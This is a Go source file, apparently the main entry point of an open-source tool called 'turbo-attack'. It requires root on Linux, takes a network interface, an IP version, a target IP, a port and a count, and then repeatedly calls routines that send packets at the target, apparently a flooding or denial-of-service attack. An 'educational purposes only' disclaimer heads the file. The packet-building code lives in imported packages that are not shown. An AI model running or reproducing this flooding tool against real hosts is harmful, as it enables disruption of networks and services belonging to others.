// Terms Of Use
// ------------
// Do NOT use this on any computer you do not own or are not allowed to run this on.
// You may NEVER attempt to sell this, it is free and open source.
// The authors and publishers assume no responsibility.
// For educational purposes only.

// go build
// PATH=/usr/local/go/bin:"$PATH" /usr/bin/dlv debug --headless --listen=:2345 --log --api-version=2 turbo-attack -- eth0 4 192.168.0.2 443 1

package main

import (
	"fmt"
	"log"
	"os"
	"runtime"
	"sync"

	"github.com/mytechnotalent/turbo-attack/convert"
	"github.com/mytechnotalent/turbo-attack/routine"
	"github.com/mytechnotalent/turbo-attack/sudo"
)

func main() {
	if runtime.GOOS != "linux" {
		fmt.Println("application will only run on linux")
		return
	}

	err := sudo.Check(0)
	if err != nil {
		log.Fatal("application will only run as root (sudo)")
	}

	if len(os.Args) != 6 {
		fmt.Println("usage: turbo-attack_010_linux_arm64 <ethInterface> <ipVersion> <ip> <port> <count>")
		return
	}

	ethInterface := os.Args[1]
	ipVersion := os.Args[2]
	ip := os.Args[3]
	port := os.Args[4]
	count := os.Args[5]

	var wg sync.WaitGroup
	if ipVersion == "4" {
		ip4Byte, portByte, countInt, err := convert.IP4(&ethInterface, &ip, &port, &count)
		if err != nil {
			log.Fatal(err)
		}
		for i := 0; i < *countInt; i++ {
			wg.Add(1)
			routine.IP4(&ethInterface, ip4Byte, portByte)
			wg.Done()
		}
		wg.Wait()
	} else if ipVersion == "6" {
		ip6Byte, portByte, countInt, err := convert.IP6(&ethInterface, &ip, &port, &count)
		if err != nil {
			log.Fatal(err)
		}
		for i := 0; i < *countInt; i++ {
			routine.IP6(&ethInterface, ip6Byte, portByte)
		}
	} else {
		fmt.Println("valid: 4 or 6")
		return
	}
	wg.Wait()
}
